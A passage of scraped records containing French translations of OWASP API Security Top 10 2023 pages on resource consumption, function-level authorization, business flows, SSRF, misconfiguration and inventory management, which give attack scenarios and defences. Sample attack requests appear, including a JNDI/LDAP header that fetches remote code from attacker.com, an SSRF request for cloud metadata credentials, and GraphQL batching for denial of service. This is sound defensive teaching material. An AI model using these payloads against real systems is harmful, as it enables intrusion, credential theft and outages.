jeton unique via SMS pour réinitialiser son mot de passe.\n\nUne fois qu'un utilisateur clique sur \"mot de passe oublié\", un appel API est envoyé depuis le navigateur de l'utilisateur vers l'API back-end :\n\n```\nPOST /initiate_forgot_password\n\n{\n  \"step\": 1,\n  \"user_number\": \"6501113434\"\n}\n```\n\nEnsuite, en coulisses, un appel API est envoyé depuis le back-end vers une API tierce qui se charge de l'envoi du SMS :\n\n```\nPOST /sms/send_reset_pass_code\n\nHost: willyo.net\n\n{\n  \"phone_number\": \"6501113434\"\n}\n```\n\nLe fournisseur tiers, Willyo, facture 0,05 $ par envoi SMS.\n\nUn attaquant écrit un script qui envoie le premier appel API des dizaines de milliers de fois. Le back-end suit et demande à Willyo d'envoyer des dizaines de milliers de SMS, ce qui conduit l'entreprise à perdre des milliers de dollars en quelques minutes.\n\n### Scénario #2\n\nUn endpoint API GraphQL permet à l'utilisateur de télécharger une photo de profil.\n\n```\nPOST /graphql\n\n{\n  \"query\": \"mutation {\n    uploadPic(name: \\\"pic1\\\", base64_pic: \\\"R0FOIEFOR0xJVA…\\\") {\n      url\n    }\n  }\"\n}\n```\n\nUne fois le téléchargement terminé, l'API génère plusieurs miniatures de tailles différentes basées sur l'image téléchargée. Cette opération graphique consomme beaucoup de mémoire.\n\nL'API met en œuvre une protection traditionnelle de \"rate limiting\" - un utilisateur ne peut pas accéder trop de fois à l'endpoint GraphQL en peu de temps. L'API vérifie également la taille de l'image téléchargée avant de générer des miniatures pour éviter de traiter des images trop grandes.\n\nUn attaquant peut facilement contourner ces mécanismes, en exploitant la nature flexible de GraphQL :\n\n```\nPOST /graphql\n\n[\n  {\"query\": \"mutation {uploadPic(name: \\\"pic1\\\", base64_pic: \\\"R0FOIEFOR0xJVA…\\\") {url}}\"},\n  {\"query\": \"mutation {uploadPic(name: \\\"pic2\\\", base64_pic: \\\"R0FOIEFOR0xJVA…\\\") {url}}\"},\n  ...\n  {\"query\": \"mutation {uploadPic(name: \\\"pic999\\\", base64_pic: \\\"R0FOIEFOR0xJVA…\\\") {url}}\"},\n}\n```\n\nComme l'API ne limite pas le nombre de fois où l'opération `uploadPic` peut être tentée, l'appel entraînera l'épuisement de la mémoire du serveur et un déni de service.\n\n### Scénario #3\n\nUn fournisseur de services permet aux clients de télécharger des fichiers de grande taille via une API. Ces fichiers sont stockés dans un stockage d'objets cloud et ne changent pas souvent. Le fournisseur de services s'appuie sur un service de cache pour avoir un meilleur taux de service et pour maintenir une faible consommation de bande passante. Le service de cache ne met en cache que les fichiers ayant une taille de maximum 15 Go.\n\nQuand l'un des fichiers est mis à jour, sa taille augmente à 18 Go. Tous les clients du service commencent immédiatement à télécharger la nouvelle version. Comme il n'y a pas eu d'alertes sur le coût de consommation, ni de limite de coût maximal pour le service cloud, la facture mensuelle suivante passe de 13 $ en moyenne à 8 000 $.\n\n## Comment s'en prémunir\n\n* Utilisez une solution qui facilite la limitation de la [mémoire][1], du [CPU][2], du [nombre de redémarrages][3], des descripteurs de fichiers et des processus tels que les conteneurs / le code Serverless (par exemple, les Lambdas).\n* Définissez et appliquez une taille maximale de données sur tous les paramètres et payloads entrants, telle que la longueur maximale des chaînes, le nombre maximal d'éléments dans les tableaux et la taille maximale des fichiers téléchargés (qu'ils soient stockés localement ou dans un stockage cloud).\n* Mettez en place une limite sur la fréquence à laquelle un client peut interagir avec l'API dans un intervalle de temps défini (rate limiting).\n* Le \"rate limiting\" doit être ajustée méticuleusement en fonction des besoins de l'entreprise. Certains points d'accès API peuvent nécessiter des politiques plus strictes.\n* Limitez/ralentissez le nombre de fois ou la fréquence à laquelle un client/utilisateur API défini peut exécuter certaines opérations (par exemple, valider un OTP, ou demander une récupération de mot de passe sans visiter l'URL à usage unique).\n* Ajoutez une validation appropriée côté serveur pour les paramètres de la requête et son contenu, en particulier ceux qui contrôlent le nombre d'enregistrements à renvoyer dans la réponse (principe de pagination).\n* Configurez des limites de dépenses pour tous les fournisseurs de services/intégrations API. Lorsque cela n'est pas possible, configurez plutôt des alertes de facturation.\n\n## Références\n\n### OWASP\n\n* [\"Availability\" - Web Service Security Cheat Sheet][5]\n* [\"DoS Prevention\" - GraphQL Cheat Sheet][6]\n* [\"Mitigating Batching Attacks\" - GraphQL Cheat Sheet][7]\n\n### Externes\n\n* [CWE-770: Allocation of Resources Without Limits or Throttling][8]\n* [CWE-400: Uncontrolled Resource Consumption][9]\n* [CWE-799: Improper Control of Interaction Frequency][10]\n* \"Rate Limiting (Throttling)\" - [Security Strategies for Microservices-based\n  Application Systems][11], NIST\n\n[1]: https://docs.docker.com/config/containers/resource_constraints/#memory\n[2]: https://docs.docker.com/config/containers/resource_constraints/#cpu\n[3]: https://docs.docker.com/engine/reference/commandline/run/#restart\n[4]: https://docs.docker.com/engine/reference/commandline/run/#ulimit\n[5]: https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html#availability\n[6]: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html#dos-prevention\n[7]: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html#mitigating-batching-attacks\n[8]: https://cwe.mitre.org/data/definitions/770.html\n[9]: https://cwe.mitre.org/data/definitions/400.html\n[10]: https://cwe.mitre.org/data/definitions/799.html\n[11]: https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-204.pdf\n", "timestamp": "2025-10-24T22:26:56.113780"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fr/0xa5-broken-function-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fr/0xa5-broken-function-level-authorization.md", "content": "# API5:2023 Broken Function Level Authorization\n\n| Facteurs de menace / Vecteurs d'attaque | Faille de sécurité | Impact |\n| - | - | - |\n| Spécifique à l'API : Exploitabilité **Facile** | Prévalence **Courante** : Détectabilité **Facile** | Technique **Grave** : Spécifique à l'organisation |\n| L'exploitation nécessite que l'attaquant envoie des appels API légitimes à un point d'accès API auquel il ne devrait pas avoir accès en tant qu'utilisateur anonyme ou utilisateur régulier, non privilégié. Les points d'accès exposés seront facilement exploités. | Les vérifications d'autorisation pour une fonction ou une ressource sont généralement gérées via la configuration ou le code. Implémenter des vérifications appropriées peut être une tâche confuse car les applications modernes peuvent contenir de nombreux types de rôles, de groupes et de hiérarchies d'utilisateurs complexes (par exemple, des sous-utilisateurs ou des utilisateurs avec plus d'un rôle). Il est plus facile de découvrir ces failles dans les API car les API sont plus structurées et l'accès à différentes fonctions est plus prévisible. | De telles failles permettent aux attaquants d'accéder à des fonctionnalités non autorisées. Les fonctions d'administration sont des cibles clés pour ce type d'attaque et peuvent entraîner une divulgation de données, une perte de données ou une corruption de données. En fin de compte, cela peut entraîner une interruption de service. |\n\n\n## L'API est-elle vulnérable ?\n\nLa meilleure façon de trouver des problèmes d'autorisation au niveau de la fonction est de réaliser une analyse approfondie du mécanisme d'autorisation tout en gardant à l'esprit la hiérarchie des utilisateurs, les différents rôles ou groupes dans l'application, et en posant les questions suivantes :\n\n* Un utilisateur régulier peut-il accéder à des points d'accès d'administration ?\n* Un utilisateur peut-il effectuer des actions sensibles (par exemple, création, modification ou suppression) auxquelles il ne devrait pas avoir accès en modifiant simplement la méthode HTTP (par exemple, de `GET` à `DELETE`) ?\n* Un utilisateur du groupe X peut-il accéder à une fonction qui devrait être exposée uniquement aux utilisateurs du groupe Y, en devinant simplement l'URL de l'endpoint et les paramètres (par exemple, `/api/v1/users/export_all`) ?\n\nNe supposez pas qu'un point d'accès API est quelconque ou au contraire est un endpoint d'administration seulement par son URL.\n\nCertains développeurs peuvent choisir d'exposer la plupart des points d'accès d'administration sous un chemin relatif spécifique, comme `/api/admins`, mais il est également très courant de les trouver sous d'autres chemins relatifs, partagés avec d'autres endpoints plus classiques dans les applications, comme `/api/users`.\n\n## Exemple de scénarios d'attaque\n\n### Scénario #1\n\nPendant le processus d'inscription pour une application qui n'autorise que les utilisateurs invités à rejoindre, l'application mobile déclenche un appel API à `GET /api/invites/{invite_guid}`. La réponse contient un JSON avec les détails de l'invitation, y compris le rôle de l'utilisateur et l'e-mail de l'utilisateur.\n\nUn attaquant duplique la requête et manipule la méthode HTTP et le point d'accès pour `POST /api/invites/new`. Cet endpoint ne devrait être accessible que par les administrateurs via la console d'administration. L'endpoint ne met pas en œuvre de vérifications d'autorisation au niveau de la fonction.\n\nL'attaquant exploite le problème et envoie une nouvelle invitation avec des privilèges administrateur :\n\n```\nPOST /api/invites/new\n\n{\n  \"email\": \"attacker@somehost.com\",\n  \"role\":\"admin\"\n}\n```\n\nPlus tard, l'attaquant utilise l'invitation malveillante pour se créer un compte administrateur et obtenir un accès complet au système.\n\n### Scénario #2\n\nUne API contient un point d'accès qui ne devrait être exposé qu'aux administrateurs - `GET /api/admin/v1/users/all`. Cet endpoint renvoie les détails de tous les utilisateurs de l'application et ne met pas en œuvre de vérifications d'autorisation au niveau de la fonction. Un attaquant ayant compris la structure de l'API devine adroitement comment accéder à cet endpoint, par l'URL, et retrouve ainsi tous les détails sensibles des utilisateurs pour cette application.\n\n## Comment s'en prémunir ?\n\nVotre application doit disposer d'un module d'autorisation cohérent et facile à analyser qui est invoqué depuis toutes vos fonctions métier. Souvent, cette protection est fournie par un ou plusieurs composants externes au code de l'application.\n\n* Le(s) mécanisme(s) de contrôle d'accès doivent refuser tout accès par défaut, exigeant des autorisations explicites pour des rôles spécifiques pour accéder à chaque fonction.\n* Passez en revue vos endpoints contre les failles d'autorisation au niveau de la fonction, tout en gardant à l'esprit la logique métier de l'application et la hiérarchie des groupes.\n* Assurez-vous que tous vos contrôleurs d'administration héritent d'un contrôleur d'administration abstrait qui implémente des vérifications d'autorisation basées sur le groupe/le rôle de l'utilisateur.\n* Assurez-vous que les fonctions d'administration adjointes à un contrôleur régulier (i.e. non dédié à l'admistration de l'application, e.g. : PaymentController, InvitationController, etc.) implémentent des vérifications d'autorisation basées sur le groupe et le rôle de l'utilisateur.\n\n## Références\n\n### OWASP\n\n* [Forced Browsing][1]\n* \"A7: Missing Function Level Access Control\", [OWASP Top 10 2013][2]\n* [Access Control][3]\n\n### Externes\n\n* [CWE-285: Improper Authorization][4]\n\n[1]: https://owasp.org/www-community/attacks/Forced_browsing\n[2]: https://github.com/OWASP/Top10/raw/master/2013/OWASP%20Top%2010%20-%202013.pdf\n[3]: https://owasp.org/www-community/Access_Control\n[4]: https://cwe.mitre.org/data/definitions/285.html\n", "timestamp": "2025-10-24T22:26:56.235106"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fr/0xa6-unrestricted-access-to-sensitive-business-flows.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fr/0xa6-unrestricted-access-to-sensitive-business-flows.md", "content": "# API6:2023 Unrestricted Access to Sensitive Business Flows\n\n| Facteurs de menace/Vecteurs d'attaque | Faille de sécurité | Impacts |\n| - | - | - |\n| Spécifique à l'API : Exploitabilité **Facile** | Prévalence **Répandue** : Détectabilité **Moyenne** | Technique **Modérée** : Spécifique à l'organisation |\n| L'exploitation implique généralement de comprendre le modèle commercial soutenu par l'API, de trouver des flux commerciaux sensibles et d'automatiser l'accès à ces flux, causant des dommages à l'entreprise. | Le manque de vue holistique de l'API pour soutenir pleinement les exigences commerciales tend à contribuer à la prévalence de ce problème. Les attaquants identifient manuellement les ressources (par exemple, les points d'accès) impliquées dans le flux cible et comment elles fonctionnent ensemble. Si des mécanismes d'atténuation sont déjà en place, les attaquants doivent trouver un moyen de les contourner. | En général, l'impact technique n'est pas attendu. L'exploitation pourrait nuire à l'entreprise de différentes manières, par exemple : empêcher les utilisateurs légitimes d'acheter un produit, ou entraîner une inflation dans l'économie. |\n\n## L'API est-elle vulnérable ?\n\nLors de la création d'un point d'accès (endpoint) API, il est important de comprendre le flux commercial qu'il expose. Certains flux commerciaux sont plus sensibles que d'autres, dans le sens où un accès excessif à ces flux peut nuire à l'entreprise.\n\nDes exemples courants de flux commerciaux sensibles et des risques d'accès excessif associés :\n\n* Achat d'un produit - un attaquant peut acheter tout le stock d'un article très demandé en une fois et de tous les revendre à un prix plus élevé\n* Création d'un flux de commentaires/publications - un attaquant peut spammer le système\n* Réservation - un attaquant peut réserver tous les créneaux horaires disponibles\n  et empêcher d'autres utilisateurs d'utiliser le système\n\nLe risque d'accès excessif peut varier entre les secteurs et les entreprises. Par exemple, la création de publications par un script peut être considérée comme un risque de spam par un réseau social, mais encouragée par un autre réseau social.\n\nUne API est vulnérable si elle expose un flux commercial sensible sans restreindre de manière appropriée l'accès à celui-ci.\n\n## Exemple de scénarios d'attaque\n\n### Scénario #1\n\nUne entreprise de tech annonce qu'elle va sortir une nouvelle console de jeu le jour de Thanksgiving. Le produit est très demandé et le stock est limité. Un attaquant écrit un code pour acheter automatiquement le nouveau produit et finaliser la transaction.\n\nLe jour de la sortie, l'attaquant exécute le code distribué sur différentes adresses IP et emplacements. L'API ne met pas en place les protections appropriées et permet à l'attaquant d'acheter la majorité du stock avant les autres utilisateurs légitimes.\n\nPlus tard, l'attaquant revend le produit sur une autre plateforme pour un prix beaucoup plus élevé.\n\n### Scénario #2\n\nUne compagnie aérienne propose l'achat de billets en ligne sans frais d'annulation. Un utilisateur malveillant réserve 90% des sièges d'un vol désiré.\n\nQuelques jours avant le vol, l'utilisateur malveillant annule tous les billets en une seule fois, forçant la compagnie aérienne à réduire les prix des billets pour remplir le vol.\n\nÀ ce stade, l'utilisateur achète un seul billet qui est beaucoup moins cher que le billet original.\n\n### Scénario #3\n\nUne application de covoiturage propose un programme de parrainage - les utilisateurs peuvent inviter leurs amis et gagner des crédits pour chaque ami qui a rejoint l'application. Ces crédits peuvent être utilisés plus tard comme de l'argent pour réserver des trajets.\n\nUn attaquant exploite ce flux en écrivant un script pour automatiser le processus d'inscription, chaque nouvel utilisateur ajoutant des crédits au portefeuille de l'attaquant.\n\nL'attaquant peut ensuite profiter de trajets gratuits ou vendre les comptes avec des crédits excessifs contre de l'argent.\n\n## Comment s'en prémunir ?\n\nLa planification de mitigation doit être effectuée en deux couches :\n\n* Business - identifier les flux commerciaux qui pourraient nuire à l'entreprise s'ils \"taient utilisés de manière excessive.\n* Ingénierie - choisir les bons mécanismes de protection pour atténuer le risque commercial.\n\n    Certains mécanismes de protection sont plus simples tandis que d'autres sont plus difficiles à mettre en œuvre. Les méthodes suivantes sont utilisées pour ralentir les menaces automatisées :\n\n    * Empreinte de l'appareil : refuser le service aux appareils clients inattendus (par exemple, les navigateurs sans interface graphique) tend à inciter les acteurs malveillants à utiliser des solutions plus sophistiquées, donc plus coûteuses pour eux\n    * Détection humaine : utiliser soit un captcha, soit des solutions biométriques plus avancées (par exemple : biométrie par modèles de frappe)\n    * Modèles non humains : analyser le flux de l'utilisateur pour détecter les modèles non humains (par exemple, l'utilisateur a accédé aux fonctions \"ajouter au panier\" et \"compléter l'achat\" en moins d'une seconde)\n    * Considérer le blocage des adresses IP des nœuds de sortie Tor et des proxies bien connus\n\n    Sécurisez et limitez l'accès aux API qui sont consommées directement par des machines (comme les API de développeur et B2B). Elles sont souvent une cible facile pour les attaquants car elles n'implémentent souvent pas tous les mécanismes de protection nécessaires.\n\n## Références \n\n### OWASP\n\n* [OWASP Automated Threats to Web Applications][1]\n* [API10:2019 Insufficient Logging & Monitoring][2]\n\n[1]: https://owasp.org/www-project-automated-threats-to-web-applications/\n[2]: https://owasp.org/API-Security/editions/2019/en/0xaa-insufficient-logging-monitoring/\n\n", "timestamp": "2025-10-24T22:26:56.349286"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fr/0xa7-server-side-request-forgery.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fr/0xa7-server-side-request-forgery.md", "content": "# API7:2023 Server Side Request Forgery\n\n| Facteurs de menace / Vecteurs d'attaque | Faille de sécurité | Impacts |\n| - | - | - |\n| Spécifique à l'API : Exploitabilité **Facile** | Prévalence **Courante** : Détectabilité **Facile** | Technique **Modérée** : Spécifique à l'organisation |\n| L'exploitation nécessite que l'attaquant trouve un point d'accès API qui accède à une URI fournie par le client. En général, l'exploitation de la SSRF de base (lorsque la réponse est renvoyée à l'attaquant) est plus facile que la SSRF aveugle, dans laquelle l'attaquant n'a aucun retour d'information sur le succès de l'attaque. | Les concepts modernes de développement d'applications encouragent les développeurs à accéder à des URI fournies par le client. Le manque de validation ou une validation incorrecte de ces URI sont des problèmes courants. L'analyse des réponses et des requêtes associées sera nécessaire pour détecter le problème. Lorsque la réponse n'est pas renvoyée (SSRF aveugle), la détection de la vulnérabilité nécessite plus d'efforts et de créativité. | L'exploitation réussie peut entraîner une énumération des services internes (par exemple, un balayage de ports), une divulgation d'informations, le contournement des pare-feu ou d'autres mécanismes de sécurité. Dans certains cas, cela peut entraîner un déni de service ou l'utilisation du serveur comme proxy pour masquer des activités malveillantes. |\n\n## L'API est-elle vulnérable ?\n\nLa SSRF (Server-Side Request Forgery) se produit lorsqu'une API récupère une ressource distante sans valider l'URL fournie par l'utilisateur. Cela permet à un attaquant de forcer l'application à envoyer une requête forgée vers une destination inattendue, même si elle est protégée par un pare-feu ou un VPN.\n\nLes concepts modernes de développement d'applications rendent la SSRF plus courante et plus dangereuse.\n\nEncore plus courant - les concepts suivants encouragent les développeurs à accéder à une ressource externe en fonction de l'entrée utilisateur : les webhooks, le téléchargement de fichiers à partir d'URL, les SSO personnalisés et les aperçus d'URL.\n\nEncore plus dangereux - les technologies modernes comme les fournisseurs de cloud, Kubernetes et Docker exposent des canaux de gestion et de contrôle via HTTP sur des chemins prévisibles et bien connus. Ces canaux sont une cible facile pour une attaque SSRF.\n\nIl est de plus en plus difficile de limiter le trafic sortant de votre application, en raison de la nature connectée des applications modernes.\n\nLe risque de SSRF ne peut pas toujours être complètement éliminé. Lors du choix d'un mécanisme de protection, il est important de tenir compte des risques et des besoins de l'entreprise.\n\n## Exemple de scénarios d'attaque\n\n### Scénario #1\n\nUn réseau social permet aux utilisateurs de télécharger des photos de profil. L'utilisateur peut choisir de télécharger le fichier image depuis sa machine, ou de fournir l'URL de l'image. En choisissant la seconde option, cela déclenchera l'appel API suivant :\n\n```\nPOST /api/profile/upload_picture\n\n{\n  \"picture_url\": \"http://example.com/profile_pic.jpg\"\n}\n```\n\nUn attaquant peut envoyer une URL malveillante et initier un balayage de ports à l'intérieur du réseau interne en utilisant le point d'accès API.\n\n```\n{\n  \"picture_url\": \"localhost:8080\"\n}\n```\n\nEn fonction du temps de réponse, l'attaquant peut déterminer si le port est ouvert ou non.\n\n### Scénario #2\n\nUn service de sécurité génère des événements lorsqu'il détecte des anomalies dans le réseau. Certaines équipes préfèrent examiner les événements dans un système de surveillance plus large et plus générique, tel qu'un SIEM (Security Information and Event Management). À cette fin, le produit fournit une intégration avec d'autres systèmes en utilisant des webhooks.\n\nDans le cadre de la création d'un nouveau webhook, une mutation GraphQL est envoyée avec l'URL de l'API SIEM.\n\n```\nPOST /graphql\n\n[\n  {\n    \"variables\": {},\n    \"query\": \"mutation {\n      createNotificationChannel(input: {\n        channelName: \\\"ch_piney\\\",\n        notificationChannelConfig: {\n          customWebhookChannelConfigs: [\n            {\n              url: \\\"http://www.siem-system.com/create_new_event\\\",\n              send_test_req: true\n            }\n          ]\n    \t  }\n  \t  }){\n    \tchannelId\n  \t}\n\t}\"\n  }\n]\n\n```\n\nPendant le processus de création, l'API back-end envoie une requête de test à l'URL du webhook fournie, et présente à l'utilisateur la réponse.\n\nUn attaquant peut exploiter ce flux, et faire en sorte que l'API envoie une requête à une ressource sensible, telle qu'un service interne cloud de métadonnées qui expose des informations d'identification :\n\n```\nPOST /graphql\n\n[\n  {\n    \"variables\": {},\n    \"query\": \"mutation {\n      createNotificationChannel(input: {\n        channelName: \\\"ch_piney\\\",\n        notificationChannelConfig: {\n          customWebhookChannelConfigs: [\n            {\n              url: \\\"http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm\\\",\n              send_test_req: true\n            }\n          ]\n        }\n      }) {\n        channelId\n      }\n    }\n  }\n]\n```\n\nPuisque l'application affiche la réponse de la requête de test, l'attaquant peut voir les informations d'identification de l'environnement cloud.\n\n## Comment s'en prémunir\n\n* Isoler le mécanisme de récupération des ressources dans votre réseau : ces fonctionnalités sont généralement destinées à récupérer des ressources distantes et non internes.\n* Chaque fois que possible, utilisez des listes d'autorisation :\n    * Les origines distantes à partir desquelles les utilisateurs sont censés télécharger des ressources (par exemple, Google Drive, Gravatar, etc.)\n    * Les schémas d'URL et les ports\n    * Les types de médias acceptés pour une fonctionnalité donnée\n* Désactivez les redirections HTTP.\n* Utilisez un analyseur d'URL bien testé et maintenu pour éviter les problèmes causés par des incohérences d'analyse d'URL.\n* Validez et assainissez toutes les données d'entrée fournies par le client.\n* Ne renvoyez pas de réponses brutes aux clients.\n\n## Références\n\n### OWASP\n\n* [Server Side Request Forgery][1]\n* [Server-Side Request Forgery Prevention Cheat Sheet][2]\n\n### Externes\n\n* [CWE-918: Server-Side Request Forgery (SSRF)][3]\n* [URL confusion vulnerabilities in the wild: Exploring parser inconsistencies,\n   Snyk][4]\n\n[1]: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery\n[2]: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html\n[3]: https://cwe.mitre.org/data/definitions/918.html\n[4]: https://snyk.io/blog/url-confusion-vulnerabilities/\n", "timestamp": "2025-10-24T22:26:56.465390"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fr/0xa8-security-misconfiguration.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fr/0xa8-security-misconfiguration.md", "content": "# API8:2023 Security Misconfiguration\n\n| Facteurs de menace / Vecteurs d'attaque | Faille de sécurité | Impact |\n| - | - | - |\n| Spécifique à l'API : Exploitabilité **Facile** | Prévalence **Courante** : Détectabilité **Facile** | Technique **Grave** : Spécifique à l'organisation |\n| Les attaquants cherchent souvent à trouver des failles non corrigées, des points d'accès courants, des services fonctionnant avec des configurations par défaut non sécurisées ou des fichiers et répertoires non protégés pour obtenir un accès non autorisé ou des informations sur le système. La plupart de ces informations sont publiques et des exploits peuvent être disponibles. | La mauvaise configuration de sécurité peut se produire à n'importe quel niveau de la pile API, du réseau à l'application. Des outils automatisés sont disponibles pour détecter et exploiter des configurations incorrectes telles que des services inutiles ou des options héritées. | Les mauvaises configurations de sécurité exposent non seulement des données utilisateur sensibles, mais aussi des détails système qui peuvent conduire à la compromission complète du serveur. |\n\n## L'API est-elle vulnérable ?\n\nL'API peut être vulnérable si :\n\n* La sécurisation appropriée est absente à travers n'importe quelle partie de la pile API, ou si les permissions sur les services cloud sont mal configurées\n* Les derniers correctifs de sécurité sont manquants, ou si les systèmes sont obsolètes\n* Des fonctionnalités inutiles sont activées (par exemple, les verbes HTTP, les fonctionnalités de journalisation)\n* Il y a des divergences dans la façon dont les requêtes entrantes sont traitées par les serveurs dans la chaîne du serveur HTTP\n* La sécurité du transport (TLS) est absente\n* Les directives de sécurité ou de contrôle de cache ne sont pas envoyées aux clients\n* Une politique Cross-Origin Resource Sharing (CORS) est manquante ou mal configurée\n* Les messages d'erreur incluent des traces de pile, ou exposent d'autres informations sensibles\n\n## Exemple de scénarios d'attaque\n\n### Scénario #1\n\nUn serveur back-end d'API maintient un journal d'accès écrit par un utilitaire de journalisation open-source populaire avec prise en charge de l'expansion de paramètres et des recherches JNDI (Java Naming and Directory Interface), tous deux activés par défaut. Pour chaque requête, une nouvelle entrée est écrite dans le fichier journal avec le modèle suivant : `<méthode> <version_api>/<chemin> - <code_statut>`.\n\nUn acteur malveillant émet la requête API suivante, qui est écrite dans le fichier journal d'accès :\n\n```\nGET /health\nX-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}\n```\n\nEn raison de la configuration par défaut non sécurisée de l'utilitaire de journalisation et d'une politique de sortie réseau permissive, pour écrire l'entrée correspondante dans le journal d'accès, tout en développant la valeur de l'en-tête de requête `X-Api-Version`, l'utilitaire de journalisation va extraire et exécuter l'objet `Malicious.class` du serveur contrôlé à distance par l'attaquant.\n\n### Scénario #2\n\nUn site web de réseau social propose une fonctionnalité de \"Message Direct\" qui permet aux utilisateurs de garder des conversations privées. Pour récupérer de nouveaux messages pour une conversation spécifique, le site web émet la requête API suivante (l'interaction de l'utilisateur n'est pas requise) :\n\n```\nGET /dm/user_updates.json?conversation_id=1234567&cursor=GRlFp7LCUAAAA\n```\n\nParce que la réponse de l'API ne comprend pas l'en-tête HTTP `Cache-Control`, les conversations privées sont mises en cache par le navigateur web, permettant aux acteurs malveillants de les récupérer à partir des fichiers de cache du navigateur.\n\n## Comment s'en prémunir ?\n\nLe cycle de vie de l'API devrait inclure :\n\n* Un processus de durcissement reproductible menant à un déploiement rapide et facile d'un environnement correctement sécurisé\n* Une tâche pour examiner et mettre à jour les configurations dans toute la pile API. L'examen devrait inclure : les fichiers d'orchestration, les composants API et les services cloud (par exemple, les autorisations de compartiment S3)\n* Un processus automatisé pour évaluer en continu l'efficacité de la configuration et des paramètres dans tous les environnements\n\nDe plus :\n\n* Assurez-vous que toutes les communications API du client vers le serveur API et tout composant en aval/amont se font sur un canal de communication chiffré (TLS), qu'il s'agisse d'une API interne ou publique.\n* Soyez spécifique sur les verbes HTTP par lesquels chaque API peut être accédée : tous les autres verbes HTTP devraient être désactivés (par exemple, HEAD).\n* Les API s'attendant à être accessibles depuis des clients basés sur un navigateur (par exemple, une interface WebApp) devraient, au moins :\n    * implémenter une politique Cross-Origin Resource Sharing (CORS) appropriée\n    * inclure les en-têtes de sécurité applicables\n* Restreignez les types de contenu/format de données entrants à ceux qui répondent aux exigences commerciales/fonctionnelles.\n* Assurez-vous que tous les serveurs dans la chaîne du serveur HTTP (par exemple, les équilibreurs de charge, les proxies et les proxies inverses, ainsi que les serveurs back-end) traitent les requêtes entrantes de manière uniforme pour éviter les problèmes de désynchronisation.\n* Lorsque cela est applicable, définissez et appliquez tous les schémas de charge utile de réponse API, y compris les réponses d'erreur, pour empêcher les traces d'exception et d'autres informations précieuses d'être renvoyées aux attaquants.\n\n## Références\n\n### OWASP\n\n* [OWASP Secure Headers Project][1]\n* [Configuration and Deployment Management Testing - Web Security Testing\n  Guide][2]\n* [Testing for Error Handling - Web Security Testing Guide][3]\n* [Testing for Cross Site Request Forgery - Web Security Testing Guide][4]\n\n### Externes\n\n* [CWE-2: Environmental Security Flaws][5]\n* [CWE-16: Configuration][6]\n* [CWE-209: Generation of Error Message Containing Sensitive Information][7]\n* [CWE-319: Cleartext Transmission of Sensitive Information][8]\n* [CWE-388: Error Handling][9]\n* [CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response\n  Smuggling')][10]\n* [CWE-942: Permissive Cross-domain Policy with Untrusted Domains][11]\n* [Guide to General Server Security][12], NIST\n* [Let's Encrypt: a free, automated, and open Certificate Authority][13]\n\n[1]: https://owasp.org/www-project-secure-headers/\n[2]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README\n[3]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/README\n[4]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery\n[5]: https://cwe.mitre.org/data/definitions/2.html\n[6]: https://cwe.mitre.org/data/definitions/16.html\n[7]: https://cwe.mitre.org/data/definitions/209.html\n[8]: https://cwe.mitre.org/data/definitions/319.html\n[9]: https://cwe.mitre.org/data/definitions/388.html\n[10]: https://cwe.mitre.org/data/definitions/444.html\n[11]: https://cwe.mitre.org/data/definitions/942.html\n[12]: https://csrc.nist.gov/publications/detail/sp/800-123/final\n[13]: https://letsencrypt.org/\n", "timestamp": "2025-10-24T22:26:56.576844"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fr/0xa9-improper-inventory-management.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fr/0xa9-improper-inventory-management.md", "content": "# API9:2023 Improper Inventory Management\n\n| Facteurs de menace/Vecteurs d'attaque | Faiblesse de sécurité | Impacts |\n| - | - | - |\n| Spécifique à l'API : Exploitabilité **Facile** | Prévalence **Répandue** : Détection **Moyenne** | Technique **Modérée** : Spécifique à l'organisation |\n| Les attaquants cherchent généralement à accéder de manière non autorisée à travers d'anciennes versions d'API ou des points d'accès laissés non corrigés et utilisant des exigences de sécurité plus faibles. Dans certains cas, des exploits sont disponibles. Alternativement, ils peuvent accéder à des données sensibles via un tiers avec lequel il n'y a aucune raison de partager des données. | Une documentation obsolète rend plus difficile la recherche et/ou la correction des vulnérabilités. L'absence d'inventaire des actifs et de stratégies de retraite conduit à l'exécution de systèmes non corrigés, entraînant une fuite de données sensibles. Il est courant de trouver des hôtes API inutilement exposés en raison de concepts modernes tels que les microservices, qui facilitent le déploiement et l'indépendance des applications (par exemple, le cloud computing, K8S). Une simple recherche Google Dorking, une énumération DNS ou l'utilisation de moteurs de recherche spécialisés pour divers types de serveurs (webcams, routeurs, serveurs, etc.) connectés à Internet suffiront pour découvrir des cibles. | Les attaquants peuvent accéder à des données sensibles, voire prendre le contrôle du serveur. Parfois, différentes versions/déploiements d'API sont connectés à la même base de données avec des données réelles. Les agents de menace peuvent exploiter des points d'accès obsolètes disponibles dans d'anciennes versions d'API pour accéder à des fonctions d'administration ou exploiter des vulnérabilités connues. |\n\n## L'API est-elle vulnérable ?\n\nLes API modernes sont souvent exposées à des risques de sécurité en raison de la complexité des applications et de la nature connectée des systèmes. Les API sont souvent mal documentées, ce qui rend difficile la recherche et la correction des 